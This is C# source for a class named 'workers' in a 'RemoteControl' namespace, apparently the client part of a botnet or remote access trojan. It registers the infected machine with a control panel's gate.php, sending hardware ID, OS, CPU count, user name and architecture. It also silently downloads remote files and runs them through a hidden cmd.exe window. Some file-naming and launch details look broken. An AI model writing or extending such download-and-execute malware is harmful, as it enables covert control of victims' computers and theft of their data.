using System;
using System.Net;
using System.Diagnostics;

namespace RemoteControl
{
    class workers
    {
        public static string request(string page)
        {
            Console.WriteLine(page);
            using (WebClient client = new WebClient())
            {
                try
                {
                    return client.DownloadString(settings.panel + page);
                }
                catch (Exception)
                {
                    return "";
                }

            }
        }

        public static void download(string link)
        {
            string[] tmp = link.Split('.');
            string ext = tmp[tmp.Length - 1];
            string name = settings.save_path + "\\" + helpers.gen_name(6);

            WebClient download = new WebClient();
            download.DownloadFile(link, name + ext);

            cmd(name);
        }

        public static void cmd(string agr)
        {
            Process p = new Process();

            ProcessStartInfo ps = new ProcessStartInfo();
            ps.Arguments = agr;
            ps.FileName = "cmd.exe";
            ps.UseShellExecute = false;
            ps.CreateNoWindow = true;
            ps.WindowStyle = ProcessWindowStyle.Hidden;

            p.StartInfo = ps;
            p.Start();
        }
        
        public static void first_seen()
        {
            request(
                "/gate.php" +
                "?hwid=" + helpers.hwid() +
                "&wind=" + win_ver.getOSInfo() +
                "&cpus=" + Environment.ProcessorCount.ToString() +
                "&user=" + Environment.UserName +
                "&arch=" + helpers.arch()
            );
        }
    }
}
